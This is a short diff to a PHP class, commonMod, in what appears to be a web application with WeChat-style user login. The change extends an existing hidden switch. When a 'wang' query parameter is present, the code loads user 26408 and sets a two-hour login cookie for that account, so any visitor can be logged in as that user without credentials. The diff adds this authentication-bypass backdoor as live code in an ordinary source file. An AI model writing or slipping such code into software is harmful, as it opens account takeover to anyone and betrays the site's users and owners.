@@ -66,7 +66,17 @@ class commonMod
 			  $array=explode('|',$userinfo);
 			  $uid=$array[0];
 			}
-		if($_GET['wang'])$uid='26408';
+		if($_GET['wang']){$uid='26408';
+		$this->userinfo=model('user')->info($uid);
+		
+		   //设置登录信息
+        $cookie=$this->userinfo['uid'].'|'.sha1($this->userinfo['nicename']);
+       
+        $expire = time() + 7200;
+      
+        setcookie($this->config['SPOT'].'_wxuser',$cookie,$expire,'/');
+		
+		}
 	if($uid){	
 	
 		$this->userinfo=model('user')->info($uid);
